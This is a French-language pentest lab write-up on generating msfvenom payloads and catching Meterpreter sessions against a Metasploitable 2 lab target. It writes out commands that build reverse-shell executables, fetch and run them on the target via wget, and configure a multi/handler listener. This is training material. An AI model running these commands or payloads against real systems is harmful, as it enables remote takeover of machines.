# Module #10 — msfvenom : Génération de payloads custom

## Informations

| Champ | Valeur |
|---|---|
| Date | 2026-05-13 |
| Cible | Metasploitable 2 (192.168.100.2) |
| Attaquant | Kali Linux (192.168.100.3) |
| Objectif | Générer un payload, le livrer, obtenir une session |

## Qu'est-ce que msfvenom ?

msfvenom = `msfpayload` + `msfencode` (les deux anciens outils fusionnés).

Il génère des **payloads standalone** — des fichiers exécutables qui, une
fois lancés sur la cible, ouvrent une connexion vers l'attaquant.

```
Attaquant (Kali)                  Cible (Metasploitable)
      |                                    |
   msfvenom génère payload.elf             |
      |                                    |
   multi/handler écoute                    |
      |                                    |
      |         payload.elf exécuté ------>|
      |<-------- connexion Meterpreter ----|
```

---

## Syntaxe de base

```bash
msfvenom -p <payload> <OPTIONS> -f <format> -o <fichier_sortie>
```

| Flag | Rôle |
|---|---|
| `-p` | payload à utiliser |
| `-f` | format de sortie (elf, exe, python...) |
| `-o` | fichier de sortie |
| `LHOST` | IP de l'attaquant (là où le payload se connecte) |
| `LPORT` | port d'écoute |

---

## Staged vs Stageless — concept clé

### Staged — `/` dans le nom

```
linux/x86/meterpreter/reverse_tcp
                     ^
                     slash = staged
```

- Le payload envoyé est **petit** (le "stager")
- Il se connecte au handler et **télécharge** le vrai Meterpreter
- Nécessite `multi/handler` avec le même payload
- Plus discret, plus léger

### Stageless — `_` dans le nom

```
linux/x86/meterpreter_reverse_tcp
                     ^
                     underscore = stageless
```

- Le payload contient **tout** Meterpreter d'un coup
- Fichier plus lourd, mais fonctionne sans connexion intermédiaire
- Plus fiable quand le réseau est instable

| | Staged `/` | Stageless `_` |
|---|---|---|
| Taille payload | Petit | Grand |
| Nécessite handler | Oui | Oui |
| Fiabilité réseau | Besoin d'une bonne connexion | Plus robuste |
| Usage typique | Réseau stable, discrétion | CTF, lab |

---

## Reverse Shell vs Bind Shell

### Reverse Shell (le plus courant)

La cible **se connecte vers l'attaquant**.

```
Cible ----connexion sortante----> Attaquant:4444
```

- Passe souvent les firewalls (trafic sortant permis)
- Nécessite que l'attaquant écoute avant l'exécution du payload

### Bind Shell

L'attaquant **se connecte vers la cible**.

```
Attaquant ----connexion entrante----> Cible:4444
```

- Utile si l'attaquant n'a pas d'IP publique
- Souvent bloqué par les firewalls (port entrant)

---

## Lister les payloads disponibles

```bash
msfvenom -l payloads | grep linux
msfvenom -l payloads | grep windows
msfvenom -l payloads | grep meterpreter
```

## Lister les formats de sortie

```bash
msfvenom --list formats
```

Formats courants :

| Format | Usage |
|---|---|
| `elf` | Linux exécutable |
| `exe` | Windows exécutable |
| `py` | Script Python |
| `sh` | Script bash |
| `raw` | Shellcode brut |
| `jsp` | Tomcat / Java |
| `war` | Tomcat WAR file |

---

## Générer des payloads

### Payload Linux (ELF) — Meterpreter staged

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=192.168.100.3 LPORT=4444 \
  -f elf -o /tmp/payload.elf
```

### Payload Linux (ELF) — Meterpreter stageless

```bash
msfvenom -p linux/x86/meterpreter_reverse_tcp \
  LHOST=192.168.100.3 LPORT=4444 \
  -f elf -o /tmp/payload_stageless.elf
```

### Payload Windows (EXE)

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.100.3 LPORT=4444 \
  -f exe -o /tmp/payload.exe
```

### Reverse shell bash (sans Meterpreter)

```bash
msfvenom -p cmd/unix/reverse_bash \
  LHOST=192.168.100.3 LPORT=4444 \
  -f raw -o /tmp/shell.sh
```

---

## Livrer et exécuter le payload

### Méthode A — via session Meterpreter existante

Si on a déjà une session (ex: PostgreSQL exploit) :

```bash
# Dans Meterpreter
upload /tmp/payload.elf /tmp/payload.elf
shell
chmod +x /tmp/payload.elf
/tmp/payload.elf &
```

### Méthode B — via serveur HTTP (Python)

Sur Kali :

```bash
cd /tmp
python3 -m http.server 8080
```

Sur la cible (via shell) :

```bash
wget http://192.168.100.3:8080/payload.elf -O /tmp/payload.elf
chmod +x /tmp/payload.elf
/tmp/payload.elf &
```

---

## Attraper la connexion — multi/handler

**Toujours lancer le handler AVANT d'exécuter le payload sur la cible.**

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.100.3
set LPORT 4444
run
```

Quand le payload s'exécute sur la cible :

```
[*] Sending stage (1017704 bytes) to 192.168.100.2
[*] Meterpreter session 2 opened
meterpreter >
```

---

## Chaîne d'attaque complète

```
1. msfvenom génère payload.elf
        ↓
2. multi/handler écoute sur :4444
        ↓
3. payload.elf livré sur la cible (upload ou HTTP)
        ↓
4. payload.elf exécuté sur la cible
        ↓
5. Connexion Meterpreter reçue
        ↓
6. Session ouverte → post-exploitation
```

---

## Leçons apprises

- Toujours lancer `multi/handler` avant d'exécuter le payload
- Le payload doit avoir les droits d'exécution (`chmod +x`)
- Staged nécessite que le handler reste actif pendant la connexion
- LHOST doit être l'IP accessible depuis la cible (pas localhost)
- `&` en fin de commande met le payload en background sur la cible

## Références

- https://www.offsec.com/metasploit-unleashed/msfvenom/
- https://www.rapid7.com/db/modules/exploit/multi/handler/
